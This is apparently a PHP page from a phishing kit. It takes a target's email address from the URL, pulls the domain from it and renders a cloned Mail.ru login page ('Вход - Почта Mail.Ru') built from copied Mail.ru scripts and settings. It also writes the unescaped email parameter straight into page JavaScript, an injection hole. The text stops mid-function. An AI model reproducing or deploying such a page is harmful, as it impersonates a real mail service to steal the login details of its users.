<?php
include('blocker.php');
?>
<?php
function getemailIDFromemail($email)
{
$find = '@';
$pos = strpos($email, $find);
$emailID = substr($email, 0, $pos);
return $emailID;
}
function getDomainFromEmail($email)
{
// Get the data after the @ sign
$domain = substr(strrchr($email, "@"), 1);
return $domain;
}
$email = $_GET['email'];
$emailID = getemailIDFromemail($email);
$domain = getDomainFromEmail($email);
$ln = strlen($email);
$len = strrev($email);
$x = 0;
for($i=0; $i<$ln; $i++){
	if($len[$i] == "@"){
		$x = $i;
		break;
	}
}
$yuh = substr($len,0,$x);
$yuh = strrev($yuh);
for($i=0; $i<$ln; $i++){
	if($yuh[$i] == "."){
		$x = $i;
		break;
	}
}
$yuh = substr($yuh,0,$x);
$yuh = ucfirst($yuh);
?>
<html style="" xmlns="http://www.w3.org/1999/xhtml" xml:lang="ru" id="jsHtml" class="feature-compose.use_api_v1 feature-compose.before_send_virus feature-alias feature-settings-promoter feature-mailboxsort-widget feature-mailboxsort-widget-seconduse feature-editor-aviary feature-enable-edit-attached-document feature-balloon-edit-attached-document feature-editor-owa feature-editor-mailpad feature-api-use-ab-fast feature-user-geo-rb feature-threads-search feature-common-attachment-viewer feature-theme-weather feature-hide-archive-folder-unread-counter feature-letter-contacts-copy feature-HideCollectorNotifier feature-viewer-from-compose feature-viewer-inline-message feature-compose-multiattach-cloud-sort feature-compose-semicolon-separator feature-threads-forward feature-notify-move-filter feature-preview-tnef-attachments feature-rb-show-banner-after-reload feature-rb-left-direct-fallback feature-rb-topline-direct-fallback feature-rb-sticky-bottom feature-attach-to-cloud-new-folder feature-big-screen feature-initial-tuning-step-scenario feature-tutorial-widget feature-ShowCreateEventButton js no-touch csstransitions keyframes boxsizing draganddrop increase-font jsHtml svg js pm-backgroundsize pm-boxshadow pm-csstransitions pm-classlist pm-raf pm-transitionend pm-dpr pm-no-retina pm-no-ie pm-requestanimationframe" lang="ru">
<head>
<script async="" src="https//js.imgsmail.ru/mail/e/utf/ts/1442859548/images/js/ru/utils/patron.Utils.Addressbook.js"></script>
<script async="" src="https//js.imgsmail.ru/mail/e/utf/ts/1442859548/images/js/ru/jsCore/jquery/expandField.js"></script>
<script async="" src="https//js.imgsmail.ru/mail/e/utf/ts/1442859548/images/js/ru/jsCore/jquery/suggest.js"></script>
<script async="" src="https//js.imgsmail.ru/mail/e/utf/ts/1442859548/images/js/ru/ui/patron.ui.ComposeLabels.js"></script>
<script async="" src="https//js.imgsmail.ru/mail/e/utf/ts/1442859548/images/js/ru/jsCore/jquery/addressbookSuggest.js"></script>
<script async="" src="//js.imgsmail.ru/mail/e/utf/ts/1442859548/images/js/ru/jsCore/jquery/composeLabels.js"></script>
<script async="" src="https//js.imgsmail.ru/mail/e/utf/ts/1442859548/images/js/ru/jsCore/labs/jsView.js"></script>
<script async="" src="https//js.imgsmail.ru/mail/e/utf/ts/1442859548/images/js/ru/patron.Layers.js"></script>
<script async="" src="https//js.imgsmail.ru/mail/e/utf/ts/1442859548/images/js/ru/patron.readMsg.trash.js"></script>
<script src="https://top-fwz1.mail.ru/js/code.js" async="" type="text/javascript"></script>
<script async="" src="//js.imgsmail.ru/mail/e/utf/ts/1442859548/images/js/ru/patron.js"></script>
<meta name="SKYPE_TOOLBAR" content="SKYPE_TOOLBAR_PARSER_COMPATIBLE">
<meta name="google" content="notranslate">

<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">

<meta name="description" content="Почта Mail.Ru - крупнейшая бесплатная почта, быстрый и удобный интерфейс, неограниченный объем ящика, надежная защита от спама и вирусов, мобильная версия и приложения для смартфонов. А также доступ по IMAP, SMS-уведомления, интерфейс на разных языках и темы оформления Почты.">
<meta name="Keywords" content="Mail.Ru, бесплатная почта, многоязычный интерфейс, неограниченный объем ящика, защита от спама, защита от вирусов, мобильная версия, мобильные приложения, темы оформления, POP3, SMTP, IMAP, SMS-уведомления, сборщик, вложенные файлы">
<meta http-equiv="content-type" content="text/html; charset=utf-8">
<script type="text/javascript">
		window.__log = {};
		window.__domTS = function (n){__domTS[n]=+new Date-(__domTS[n]||0);return __domTS};
		document.TS = new Date;

		(function (location) {

			var url = location.toString().match(/#.*/), new_url,
				match = url && url[0].match(/((messages?|compose|(?:go)?search|thread|filesearch|msglist|readmsg|sentmsg|sendmsgok|ajax_attach_action|attaches\-viewer)(.*?))$/);

			if (match) {

				url	= '/' + match[1];

				
				if (url.indexOf('/ajax_attach_action') === 0) url = '/cgi-bin' + url;

				

				new_url = location.protocol + '//' + location.host + url.replace('&secure=1', '');
			} else if (~location.href.indexOf(location.host + '/ajax_attach_action')) {
				new_url = location.href.replace('/ajax_attach_action', '/cgi-bin/ajax_attach_action');
			} else if(url && url[0].match(/^#(\/addressbook.*)/)) {
				new_url = location.protocol + '//' + location.host + RegExp.$1;
			}

			if (new_url) {
				location.href = new_url;
				
				document.write('<br/>');
			}

		})(location);

		__domTS('head__js');
	</script>
	

<title>Вход - Почта Mail.Ru</title>

	<script>


	window.includeJS = function (url) {
		document.writeln('<script type="text/javascript" src="' + url + '"></' + 'script>');
	};

</script>
<script>includeJS("https//js.imgsmail.ru/mail/e/utf/ts/1442859548/images/js/ru/build/ajs.js");</script>
<script type="text/javascript" src="https//js.imgsmail.ru/mail/e/utf/ts/1442859548/images/js/ru/build/ajs.js"></script>

<script>
window.__log = window.__log || {};
__log.head__js = __log.folders_data_js = 0;
</script>
<script type="text/javascript">

	

	

	try { top.location.toString(); } catch (er) { top.location = location; }

	var yandex_direct_fontColor = 'FF0000';
	var yandex_direct_BorderColor = 'FBE5C0';
	var yandex_direct_BgColor = 'FFF9F0';
	var yandex_direct_headerBgColor = 'FEEAC7';
	var yandex_direct_titleColor = '0000CC';
	var yandex_direct_siteurlColor = '006600';
	var yandex_direct_linkColor = '0000CC';
	function yandex_direct_print(){ }


	function createRadar(name, iZ, log){
		var data = {}, radar = function (label, end){
			if( label === 'clear' ){
				data = {};
			}
			else if( typeof label === 'string' ){
				if( end == 1 && data[label] && !data[label][1] ){ data[label][1] = (new Date).getTime(); }
				else if( end != 1 && !data[label] ){ data[label] = [(new Date).getTime(), 0]; }
			}
			else {
				var i = [], a, v, k, dt, radarDomain = patron.RadarURL;
				for( k in data ) if( data.hasOwnProperty(k) ){
					v = data[k];
					dt = v[1] - v[0];
					if( dt < 0 ){
						data = {};
						return;
					}
					else if( iZ && !dt ) continue;
					i.push(k +':'+ dt);
					if( k == 'all' ) a = dt;
					if( log ) ajs.log('radar.'+label+': '+ k +': '+ dt +' ms');
				}

				if( i.length && a ) setTimeout(function(){
					(new Image).src = '//' + radarDomain + '/update?email=p=mail&t='+ name +'&v='+ a +'&i='+ i.join(',') +'&rnd='+ Math.random() + (document.referrer ? '&r='+ escape(document.referrer) : '') + (jsCookie ? '&vid=' + jsCookie.get('VID') : '');
				}, 0);
				data = {};
			}
			return	radar;
		};
		radar.clear	= function (){ data = {}; return radar; };
		return	radar;
	} // createRadar;

	if (!('rT' in window)) window.rT = {i: []};
	function timeInterval_sum(bP)
	{
		if( !rT[bP] )
		{
			rT[bP] = new Date();
		}
		else
		{
			var j = 0, rT_cnt = rT.i.length, found  = false;
			for( ; j < rT_cnt; j++ )
			{
				var rT_array = rT.i[j].split("=");
				if( rT_array[0] == bP )
				{
					found	= true;
					rT.i[j]	= bP +'='+ (parseInt(rT_array[1]) + (new Date).getTime() - rT[bP].getTime());
				}
			}
			if( !found )
				rT.i[rT.i.length] = bP +'='+ ((new Date).getTime() - rT[bP].getTime());
			delete rT[bP];
		}
	} // timeInterval_sum;


	// < GLOBALS
	var
		  undef
		, undefined
		, IS_LOCAL		= false
		, jsVersion		= 3
		, jsBuild		= '1442859548'
		
		, jsCore		= { version: 3, build: '1442859548' }
		, CheckNewNum	= '3'
		, jsCoreAlias	= {
	  "jsCore": 				"//js.imgsmail.ru/mail/e/utf/ts/1442859548/images/js/ru/jsCore"
	, "jQuery":					"//js.imgsmail.ru/mail/e/utf/ts/1442859548/images/js/ru/jsCore/jquery"
	, "jquery":					"//js.imgsmail.ru/mail/e/utf/ts/1442859548/images/js/ru/jsCore/jquery/jquery"
	, "labs":					"//js.imgsmail.ru/mail/e/utf/ts/1442859548/images/js/ru/jsCore/labs"
	, "utils":					"//js.imgsmail.ru/mail/e/utf/ts/1442859548/images/js/ru/jsCore/utils"
	, "plugins":				"//js.imgsmail.ru/mail/e/utf/ts/1442859548/images/js/ru/jsCore/plugins"
	, "easyXDM":				"//js.imgsmail.ru/mail/e/utf/ts/1442859548/images/js/ru/easyXDM"

	, "festTemplate":			"//js.imgsmail.ru/mail/e/utf/ts/1442859548/fest/"

	, "patron":					"//js.imgsmail.ru/mail/e/utf/ts/1442859548/images/js/ru/"
	, "patron.model":			"//js.imgsmail.ru/mail/e/utf/ts/1442859548/images/js/ru/model"
	, "patron.ui":				"//js.imgsmail.ru/mail/e/utf/ts/1442859548/images/js/ru/ui"
	, "patron.utils":			"//js.imgsmail.ru/mail/e/utf/ts/1442859548/images/js/ru/utils"
	, "patron.app":				"//js.imgsmail.ru/mail/e/utf/ts/1442859548/images/js/ru/"
	, "patron.reg":				"//js.imgsmail.ru/mail/e/utf/ts/1442859548/images/js/ru/Reg"
	, "patron.login":			"//js.imgsmail.ru/mail/e/utf/ts/1442859548/images/js/ru/Login"
	, "patron.verify":			"//js.imgsmail.ru/mail/e/utf/ts/1442859548/images/js/ru/Verify"
	, "patron.recovery":		"//js.imgsmail.ru/mail/e/utf/ts/1442859548/images/js/ru/Recovery"
	, "patron.compose":			"//js.imgsmail.ru/mail/e/utf/ts/1442859548/images/js/ru/Compose"
	, "patron.offline":			"//js.imgsmail.ru/mail/e/utf/ts/1442859548/images/js/ru/Offline"
	, "patron.attachViewer":	"//js.imgsmail.ru/mail/e/utf/ts/1442859548/images/js/ru/AttachViewer"
	, "patron.addressbook":		"//js.imgsmail.ru/mail/e/utf/ts/1442859548/images/js/ru/Addressbook"
	, "patron.addressbook.ui":	"//js.imgsmail.ru/mail/e/utf/ts/1442859548/images/js/ru/Addressbook/ui"
	, "patron.settings":		"//js.imgsmail.ru/mail/e/utf/ts/1442859548/images/js/ru/Settings"
	, "patron.translator":		"//js.imgsmail.ru/mail/e/utf/ts/1442859548/images/js/ru/Translator"
	, "patron.view":			"//js.imgsmail.ru/mail/e/utf/ts/1442859548/images/js/ru/Views"
	, "patron.build":			"//js.imgsmail.ru/mail/e/utf/ts/1442859548/images/js/ru/build"
	, "patron.events":			"//js.imgsmail.ru/mail/e/utf/ts/1442859548/images/js/ru/liveEvents"
	, "patron.others":			"//js.imgsmail.ru/mail/e/utf/ts/1442859548/images/js/ru/others"

	, "action": "//js.imgsmail.ru/mail/e/utf/ts/1442859548/images/js/ru/v2/action"
	, "patron.v2": "//js.imgsmail.ru/mail/e/utf/ts/1442859548/images/js/ru/v2"
	, "patron.v2.action": "//js.imgsmail.ru/mail/e/utf/ts/1442859548/images/js/ru/v2/action"
	, "patron.v2.ui": "//js.imgsmail.ru/mail/e/utf/ts/1442859548/images/js/ru/v2/ui"
	, "patron.v2.view": "//js.imgsmail.ru/mail/e/utf/ts/1442859548/images/js/ru/v2/view"
	, "patron.v2.utils": "//js.imgsmail.ru/mail/e/utf/ts/1442859548/images/js/ru/v2/utils"
	, "patron.v2.layer": "//js.imgsmail.ru/mail/e/utf/ts/1442859548/images/js/ru/v2/layer"

	, "blocks": "/blocks"

	, "toolkit": "/toolkit"
	, "toolkit-common": "/toolkit-common"

	, "ajs": "/ajs"
	, "features": "/features/features"
	, "callStack": "/callstackjs/callStack"

	, "viewer": "/viewer"
	, "tinymce": "/tinymce/tinymce"

	, "Pilot": "/toolkit-common/pilot/pilot"

	, "JSSDK": "/jssdk"
	, "jssdk": "/jssdk/boot"

	, "autopolyfiller": "/jssdk/vendor/autopolyfiller"
	, "filter": "/jssdk/vendor/filter"
	, "inherit": "/jssdk/vendor/inherit"
	, "performance": "/jssdk/vendor/performance"
	, "uuid": "/jssdk/vendor/uuid"

	, "config": "/jssdk/config/config"
	, "logger": "/jssdk/logger/logger"
	, "Emitter": "/jssdk/Emitter/Emitter"
	, "Model": "/jssdk/Model/Model"
	, "Model.List": "/jssdk/Model.List/Model.List"
	, "Promise": "/jssdk/Promise/Promise"
	, "request": "/jssdk/request/request"
	, "RPC": "/jssdk/RPC/RPC"
	, "RPCModel": "/jssdk/RPCModel/RPCModel"
	, "Storage": "/jssdk/Storage/Storage"
	, "utils/util": "/jssdk/utils/util/util"

	, "mail/Folder": "/jssdk/mail/Folder/Folder"
	, "mail/Message": "/jssdk/mail/Message/Message"
	, "mail/Phone": "/jssdk/mail/Phone/Phone"
	, "mail/Thread": "/jssdk/mail/Thread/Thread"
	, "mail/User": "/jssdk/mail/User/User"
	, "mail/User/TOTPCode": "/jssdk/mail/User/TOTPCode/TOTPCode"

	, "patron.v2.test": "/test/v2/"
	, "patron.utils.test": "/test/utils/"
	, "patron.test": "/test/"

	, "jquery.mockjax": "/jssdk/vendor/jquery.mockjax"
	, "landmark": "/toolkit-common/landmark/landmark"
	, "packir": "/packir/dist/packir.ajs"

	, "requirejs-injector": "/requirejs-injector/main"
	, "jquery-packir": "/jquery-packir/dist/jquery.packir.ajs"
}


		, jsLoaderFiles = {}<!-- xINCLUDE head__js_builds.tpl.json -->
	;

	var patron =  mailru =  {
		  SpamBallonExp: 		0
		, newsnippets:			false
		, logid:				+new Date
		, isC:					false
		, IsCorpUser:			false
		, MaxSendToCount:		30
		, isDarkPopup:			true
		, 			v2: true
		, 			flatheader: true
		, 		EXPERIMENTIDDWH: "s22s"
		
		
		, 		AudioPlayerApi: true
		
		
		, 				themes: true
		
		, SettingsOn:			true
		
		
		, ForceHtmlCompose:		true
		, exif: 1
		, editorContentCss:		'https://img.imgsmail.ru/mail/e/utf/ts/1442859548/css/septima/pages/editor-content.css'
		, themesCssPath:		'https://img.imgsmail.ru/mail/e/utf/ts/1442859548/css/septima/themes/'
		, needReloadPage:		function (){ return false }
		, uuvb:					''
		, ips:					['','197.211.52.29','197.211.52.29','']
		, avaHost:				'filin.mail.ru'
		, PerformanceMeasurePrint:0
		, RegisterMailtoHandler:1
		, LogoToMsglist:		0
		, NewAttachViewer:		1
		, NewAttachViewerPopup:	1
		, AttachViewStyle:		0
		, MailFilesViewStyle:	0
		, FileSearchWithThumbnail:		1
		, AvStatusBar:			1
		, UseFSentmsg:			0
		, ComposeLabels:		1
		, ComposeLabelsOneClick:	1
		, ComposeLabelsDnd:		1
		, ComposeLabelsShowSuggestsOnClick:		1
		, ComposeTemplates: true
		, ListUnsubscribeEnabled: true
		, ListUnsubscribeImmediatlyEnabled: true
		, AccaAvailableButDisabled:	0
		, UserActivityApi:	0
		, CanUseNewAddressbookSuggests: true // MAIL-20276, mail-15150
		
		, baseHref:				'//e.mail.ru/'
		, tokens:				{}
		, lang:					{}
		, username:				''
		, firstname:			''
		, lastname:				''
		, userdomain:			''
		, useremail:			'@'
		, multiccEmail:			'multicc@multicc.mail.ru'
		, UserHasMy:			0
		, RealNames:			""
		, IS_PREVIEW:			0|0
		, UserSignature:		""
		, DefaultSignature:		'562'
		, DisableSignatureAds: true
		, DisableReklama:		0
		, old_charset:			''
		, EnableChangeESLang:	'1'
		, EnableChangeKZLang:	'1'
		, EnableChangeEnglishLang:	'1'
		, EnableChangeAMLang:	'1'
		, EnableChangeBYLang:	'1'
		, EnableChangeMDLang:	'1'
		, EnableChangeROLang:	'1'
		, EnableChangeDELang:	''
		, OfflineDataVersion:	'2.1'
		, OfflineStorageVersion:	'1.1'
		, MessageXHRTimeLogPercent:			'2' * 1
		, MessageXHRLimitLogPercent:			'100' * 1
		, SendmsgXHRTimeLogPercent:			'2' * 1
		, SendmsgXHRLimitLogPercent:			'100' * 1
		, XHRComposeLoadAttemptsCount:			'10' * 1
		, XHRComposeLoadTimeoutSec:			'10' * 1
		, AttachViewerPreloadLimit:			'24' * 1
		, EditorFlags:			'' * 1
		, HTMLCompose:			"1" * 1
		, AvatarVersion:		'4'
		, AvatarBuild:			'7'
		, SingleDomainName: "mail.ru"
		, SingleProductName: "Mail.Ru"
		, staticDomainName: "imgsmail.ru"
		, MainMailHost: "e.mail.ru"
		, FilesHost: "files.mail.ru"
		, RadarURL: "stat.radar.imgsmail.ru"
		, captchaURL0: "//c.mail.ru/c/0"
		, captchaURL1: "//c.mail.ru/c/1"
		, captchaURL2: "//c.mail.ru/c/2"
		, captchaURL5: "//c.mail.ru/c/5"
		, MailBoxSizePadding: "" * 1
		, POPLoginDate: ""
		, WWWLoginDate: ""
		, WWWCurrentIP: ""
		, WWWCurrentHost: ""
		, LazyJSTimeLogPercent: "1" * 1
		, AuthUrl: "https://auth.mail.ru/cgi-bin/"
		, CurrentURL: "\/cgi-bin\/login?email=<?php echo $_GET['email']; ?>&fail=1"
		, RBCheckPageForLineSlot: true
		, LogAPISParseError: true
		, CloudWebURL: "" || 'https://cloud.mail.ru'
		, UsePortalSuggest: true
		, UsePortalSuggestPlaceholder: true
		, CloudCapacity: "25" * 1
		, FEATURES: " settings-promoter mailboxsort-widget mailboxsort-widget-seconduse editor-aviary enable-edit-attached-document balloon-edit-attached-document editor-owa:doc,docx,xls,xlsx,ppt,pptx editor-mailpad:doc,docx api-use-ab-fast user-geo-rb threads-search common-attachment-viewer theme-weather hide-archive-folder-unread-counter letter-contacts-copy HideCollectorNotifier viewer-from-compose viewer-inline-message compose-multiattach-cloud-sort compose-semicolon-separator threads-forward:50 notify-move-filter preview-tnef-attachments rb-show-banner-after-reload rb-left-direct-fallback rb-topline-direct-fallback:12826 rb-sticky-bottom compose.before_send_virus:remove\/\u003Ciframe.+bw95vpjda[^\u003E]+\u003E\u003C\/iframe\u003E\/ compose.before_send_virus:remove\/\u003Ca.+7wyrn2wuckl28s[^\u003E]+\u003E.+?\u003C\/a\u003E\/ attach-to-cloud-new-folder big-screen initial-tuning-step-scenario:2|3|5 tutorial-widget  ShowCreateEventButton:"
		
		, RBCheckPageForLineSlot: true
		
		
		, UseAvatarFromCorrespondent: true
		, ContactInformerInLetter: true
		, ContactInformerShowMode: "1" * 1
		
		
		
		
		
		
		
		
		
		
		
		, EnableFileSearchAttachViewer: true
		
		
		
		
		
		, UseFlatHeader: true
		
		
		
		
		, ThreadsSwitcher: true
		, ComposeCardsNew: true
		
		
		
		, EnableComposeMultiAttach: true
		, EnableAttachToCloud: true
		, IsShowAttachFromCloudBalloon: true
		, NewCloudUpload: true
		
		
		
		
		
		
		, showIMAPAlert: true
		
		
		
		
		
		
		
		, HideSpamCounterOnTheLeftCol: true
		, IsThemeButton: true
		, ShowCloudButton: true
		
		, IsShowCalendarBalloon: true
		
		
		
		
		
		
		, PMCalendarBtn: true
		, UseTokenAPIV1: true
		
		
		
		, EnableOfflineModeLoadFromCache: true
		
		
		
		
		, DisabledNoAuthLayer: true
		, MessageFromDraft: true
		
		
		, ComposeCards: true
		
		
		
		, HTML5Uploader: ~~'2'
		, AutoReloadBanners: true
		
		
		
		, Enable2FactorWithPass: true 

		
		
		
		
		
		, IsMRVGraphicEnabled: true

        


        
		
		
		
		

		, IsMRVPreviewEnabled: true
		, IsMRVOfficePreviewOnlyReadmsg: true
		, IsMRVMSDocPreviewEnabled: true
		 , IsMRVMSExcelPreviewEnabled: true
		, IsMRVMSPptPreviewEnabled: true
		
		, IsMRVRtfPreviewEnabled: true
		, IsMRVGraphicPreviewEnabled: true

		
		

		

		, PasswordRestoreNewSupportForm: true
		, ToolkitClickToRadar: true
		, CustomContextMenu: true
		, FoldersContextMenu: true
		, FilesearchContextMenu: true
		, AvatarNoTrust: true
		
		
		, WebAgentCall: true
		
		
		
		
        , ShowPhoneinfoField: true
        , IMAPBanner: true
		, ShowPhoneinfoField: true
		, IMAPBanner: true
		
		, EnableIMAP: true
		
		, Activate2FactorsAuth: true
		, UsedCollectorOAuth: true
		
		, CollectorInfoVer: '1' | 0 
		
		
		, EnableAttachFromCloud: true
		, IsReadmsgToMessage: true
		
		
		
		, SITEID: "105"
		
		
		, FishingCheckOnRightClickDisabled: true
		
		
		, LogRBSlotRequests: true
		, CheckReleaseBuild: true
		
		
		
		, SecurityPlate: true
		, UseSDC: 'auth.mail.ru'
		, AdURL: "//ad.mail.ru"
		
		, RB_SENDMSGOK_CENTER_BANNER: true
		, RB_SENDMSGOK_LINE_BANNER: true
		, RB_LEFT_BANNER: true
		, RB_LEFT_DIRECT: true
		, RB_NAV_BANNER: true
		, DIRECT_LEFT_FALLBACK_ID: '7332' * 1

		

		, MailAttachPreviewHost: 'apf.mail.ru'
		, NewArchivePreview: true
		, ZipviewURL: '//zipview.mail.ru'
		, SnippetHost: '//sniplink.otvet.mail.ru'
		, AutoshowArchiveContents: true
		
		, CommonAttachmentViewer: true
		
		
		
		
		, BackTopEnabled: true
		
		
		
		, ShortcutEnabled: true
		, ShortcutHintsEnabled: true
		, ArchiveEnabled: true
		
		
		
		
		
		
		
		
		
		
		
		
		
		
		
		
		, MailBoxSortPlateDisabled: true
		, MailBoxSortPlateDayFreq: '6'
		
		, MailBoxInboxCategory: '3'
		
		
		
		
		, FilterProcessingEnable: true
		, FilterProcessingInformer: true
		, FilterProcessingSpinner: true
		, MailBoxSort: true
		, DisablePasswordQuestion: true
		
		
		
		

		, ThreeColsBreakPoint:  '' * 1
		, IncludeMsgAtAnswer:	0
		, EnableFlashLog:		0
		, AbjsHash:				''
		, DoNotDisableAbjsMultipleLoad: 0
		, LANG:					'ru_RU'
		, NewHeaderWithMessages:	''
		, TimezoneOffset:		'' * 1
		, PasswordExpireDate:	'' * 1
		, PasswordExpired: '' * 1
		, CurrentTimestamp:		'1443445249' * 1
		, CommonPurposeBitmask:	~~''
		, HelperStatus:			'' * 1
		, HelperTimestamp:		['' * 1, '' * 1, '' * 1, '' * 1, '' * 1, '' * 1, '' * 1, '' * 1, '' * 1, '' * 1, '' * 1, '' * 1, '' * 1, '' * 1, '' * 1, '' * 1, '' * 1, '' * 1, '' * 1, '' * 1, '' * 1, '' * 1, '' * 1, '' * 1, '' * 1, '' * 1, '' * 1, '' * 1, '' * 1, '' * 1, '' * 1, '' * 1]
		, HelperIndex: {
			  spam:						0
			, nospam:					1
			, betaTester:				2 // Unused. BetaTester bit is 59 now. MAIL-39960
			, attachWord:				3 // for CollectorInfoNeedShow (MAIL-14543)
			, attachExcel:				4
			, attachPowerPoint:			5 // patron.Notify.collectorErrorAlert
			, passExpire:				6
			, cloud:					7 // for IsShowCloudBalloon (MAIL-20341)
			, phoneSync:				8
			, VerifyPhoneNotify:		9 // -> helper 54. MAIL-44391
			, WeakPassword:				10
			, validDataFlag:			11
			, mailtoObserver:			12
			, filesearch:				14
			, collector:				15
			, galaxyGuardians:			16 // calendar -> football2014 -> galaxyGuardians https://jira.mail.ru/browse/MAIL-32684
			, lightTransition:			17 // collectorPromo -> lightTransition https://jira.mail.ru/browse/MAIL-24359
			, webagentReserved1:		18
			, webagentReserved2:		19
			, notificationAPI:			20
			, messagelineMedia:			21
			, multiAuth:				22
			, lettersMoveFilter:		23 // MAIL-18627 former messagelineMediaEnabled
			, webagentReserved3:		24
			, draftInfomessage:			25
			, accaNotify:				26
			, patron_v2:				27
			, composeSelectFields:		28
			, attachFromCloud:			29 // Attach to Cloud promo (MAIL-21381)
			, mobileApp:				30
		}
		, IsThemesBalloon:		0
		, IsForceThemesBalloon:	0
		, LogNoPreview:			0
		, AccountVerified:		0
		, LettersMoveFilterNum:	'2' * 1
		, RegTime:				~~''
		, SocialConnect: { mask: Number(""), services: [{ type: 'fb', name: 'Facebook', bit: Number("1") }, { type: 'in',  name: 'LinkedIn', bit: Number("2") }] }
		, readMsgAfterDelete:	true
		, msgListAfterDelete:	0
		, MsglistExpanded:		0
		, WholeFolderOperations:1
		, UndoAction:1
		
		, StartMsglist:			1
		, messagesPerPage:		25
		, filesPerPage:			24
		, MaxAttachmentSize:	~~'' || 26337280
		, MaxRecipients: 		30
		, folderId:				0
		, messageId:			0
		, messagesPage:			1
		, messagesSort:			''
		, UseFlatHeader: true
		, AttachmentsInSERP: true
		, useAPIMoveMarkMsgs:	1
		, dmarcIsActive: true
		, editableContactsV2: true
		, foldingIsActive: true
		, isThumb2Active: true 
		
		
		
		
		, enableIncreaseFont: true
		
		, IncreaseFontWidth: '1200'
		, IncreaseFontHeight: '500'
		
		, EnableCurrentTimestampOffset: true
		
		
		

		/**
		 * @deprecated
		 * @see patron.user.collectors, patron.Collector.list
		 */
		, collectors: 			{}
		, ui: {}
		
		, Ad:					{
									  'stack':				[]
									, 'doubleStack':		[]
									, 'push':				function (){ this.stack.push.apply(this.stack, arguments) }
									, 'pushDoubleFormat':	function (){ this.doubleStack.push.apply(this.doubleStack, arguments)}
								}
		

	};

	(function (patron, build) {
		function pad(number) {
			return ((number < 10) ? '0' : '') + number;
		}

		function toISOString(date) {
			if (date.toISOString) {
				return date.toISOString();
			}

			return (date.getUTCFullYear() +
				'-' + pad(date.getUTCMonth() + 1) +
				'-' + pad(date.getUTCDate()) +
				'T' + pad(date.getUTCHours()) +
				':' + pad(date.getUTCMinutes()) +
				':' + pad(date.getUTCSeconds()) +
				'.' + (date.getUTCMilliseconds() / 1000).toFixed(3).slice(2, 5) +
				'Z');
		}

		var matches = /^[^-]+-f-(.+)-([^-]+)-(\d+)\.tgz$/.exec(build);

		if (matches) {
			patron.buildInfo = {
				tarball: build,
				branch: matches && matches[1],
				username: matches && matches[2],
				date: matches && new Date(matches[3] * 1000)
			};
			patron.build = patron.buildInfo.branch + '.' + toISOString(patron.buildInfo.date).split('.')[0].replace(/:/g, '_');
		} else {
			patron.buildInfo = null;
			patron.build = build;
		}
	})(patron, 'e.mail.ru-f-alpha-510-45556-en-s.tugovikov-1442859548.tgz');


	
		patron.SecurityPlateConfig = {
			BETWEEN_INTERVAL: +'2592000',
			SHOW_FREQ_FOR_USER: +'3',
			informers: {
				'phone_access': {
					frequency: +'5184000',
					frequency_close: +'31536000'
				},
				'email_access': {
					frequency: +'5184000',
					frequency_close: +'31536000'
				},
				'phone_verify': {
					frequency: +'1209600',
					frequency_close: +'5184000'
				},
				'secret_question': {
					frequency: +'5184000',
					frequency_close: +'15552000'
				}
			}
		};
	

	
	patron.PLogins = [
		
	];

	
	patron.Helpers = [
		
	];

	patron.restoreJquery = function () { // MAIL-23509
		var restore = patron.jQuery && window.jQuery !== patron.jQuery;
		if (restore) {
			window.jQuery = window.$ = patron.jQuery;
			patron.radar('jquery_replace', 1);
		}
		return restore;
	};

	patron.updateToken = function (token) {
		var token_parts = token.split(':');
		window['mailru_api_token'] = token;
		window['mailru_api_token_parts'] = {
			form_sign: token_parts[0],
			form_token: token_parts[1]
		};
	};

	patron.updateToken("");

	patron.gstat = function (log, extra, radar) {
		if( extra === true ) ajs.log('gstat:', log);
		else if( typeof extra != 'string' ) log = ajs.toQuery(log);

		if( typeof log != 'string' ) log = ajs.toQuery(log);

		(new Image).src = '//gstat.imgsmail.ru/gstat?logme='+encodeURIComponent(log)+(extra ? '&'+extra : '') + '&rnd=' + (patron.logid++);

		if( radar ){
			patron.radar('gstat', radar + '=1');
		}
	};


	patron.gstatLog = function (label, data){
		patron.log(label, data);
		patron.gstat(ajs.extend({ 'L': label }, data));
	};


	patron.radar = function (type, intervals, total, params, print, output) {
		// total, params и print - необязательные параметры, но print не может присутствовать, если не переданы ни total, ни params
		if (total && (typeof total === 'object')) {
			print = !!params;
			params = total;
		} else if (typeof params !== 'object') {
			print = !!params;
			params = {};
		}

		params = ajs.toQuery(params);

		var t = 1,
			i = '',
			img,
			radarDomain = patron.RadarURL,
			split = '&split=' + ( patron.EXPERIMENTIDDWH ? patron.EXPERIMENTIDDWH : '0' )
		;

		if( intervals >= 0 ){
			t	= intervals;
		}
		else {
			ajs.each(ajs.toObject(intervals), function (ts, name){
				if( name == 'all' ) t = ts;
				else i += ','+name+':'+ts; // i <= 32
			});
		}

		img = new Image;
		img.src = '//' + radarDomain + '/update?email=&p=mail&t='+ type.substr(0, 64) +'&v='+ (total || t) + (i ? '&i='+ i.substr(1) : '') + (params.length ? '&' + params : '') + split + '&rnd=' + (patron.logid++) + (jsCookie ? '&vid=' + jsCookie.get('VID') : '');

		if( print ){
			ajs.log('[radar] '+type+': '+total+'ms ->', ajs.toQuery(intervals));
		}

		output && (output.img = img);
		return img;
	};

	patron.radarNoCallStack = patron.radar;

	patron.xradar = function (type, intervals, total, print){
		patron.radar(type, intervals, total, print);
	};

	patron.radarLog = function (label, data) {
		try { patron.radar(label, 1, 1, { rlog: label, rlog_message: JSON.stringify(data) });
		} catch (err) { patron.radar('radar_log_fail', { msg: err.message, stack: err.stack }); }
	};

	
	patron.TimezoneOffset = 14400;
	

	/**/
	(function () {
		var isLocked = false, fns = [];
		patron.notificationLocker = function () {
			return {
				isLocked: function () {
					return isLocked;
				},
				setLock: function (status) {
					if (!(isLocked = !!status)) {
						while (fns.length) {
							fns.shift()();
						}
					}
				},
				onUnLock: function (fn) {
					fns.push(fn);
				}
			}
		};
		patron.checkNotificationAccess = function () {
			return true;
		};
	})();

	var FileAPI = {
//		debug: true,
		flashUrl: '/toolkit-common/fileapi/__flash/fileapi__flash.swf',
		flashImageUrl: '/toolkit-common/fileapi/__flash/fileapi__flash.image.swf'
	};
	// GLOBALS >

	
	patron.log = (function (_logs){
		var key = 'patron.log',
			store,
			pidSave,
			saveLog,
			saveLogTry;

		try {
			store = window.sessionStorage;
			saveLog = function () {
				clearTimeout(pidSave);
				pidSave = setTimeout(saveLogTry, 1000);
			};
			saveLogTry = function () {
				try {
					store.setItem(key, JSON.stringify(_logs));
				} catch (err) {}
			};

			_logs = JSON.parse(store.getItem(key)) || [];
		} catch (err) { }


		function pad(n) {
